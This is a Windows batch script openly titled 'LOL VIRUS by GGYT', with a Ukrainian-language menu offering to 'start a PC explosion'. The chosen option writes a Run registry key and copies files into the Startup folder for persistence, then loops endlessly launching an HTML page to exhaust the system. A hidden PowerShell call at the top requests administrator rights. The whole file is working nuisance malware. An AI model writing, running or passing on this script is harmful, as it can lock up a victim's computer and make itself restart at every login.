@echo off
call :Adm
title LOL VIRUS by GGYT 
chcp 866
color a
cls
goto vir

:vir
cls
type C:\LOL_VIRUS\files\art.txt
echo Виберiть дiю:
echo.
echo 1 - Почати вибух ПК
echo 2 - Вийти
echo 3 - НЕ ВИБИРАТИ
echo 4 - Центр оновлень (не скоро)
echo 5 - Де бути вiрус?

echo.
Set /p choice="Ваш вибiр: "
if not defined choice goto vir
if "%choice%"=="1" (goto xd)
if "%choice%"=="2" (goto exit)
if "%choice%"=="3" (start C:\LOL_VIRUS\files\languages\ukr\NOT_OPEN_ME_PLEASE.html)
if "%choice%"=="4" (goto vir)
if "%choice%"=="5" (goto path)
cls
goto vir

:exit
set choice=0
cls
echo Ви точно хочете вийти? (y/n)
Set /p choice="Вибiр: "
if not defined choice goto exit
if "%choice%"=="n" (goto vir)
if "%choice%"=="y" (exit)
cls
goto exit

:xd
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v 111 /t REG_SZ /d "C:\LOL_VIRUS\files\xd.bat"
cls
goto yt

:yt
xcopy C:\LOL_VIRUS\files\xd "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /H
cd C:\LOL_VIRUS\files\
start base.html
goto yt

:path
cls
echo.
echo Вiн у C:\LOL_VIRUS
pause
goto vir

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)





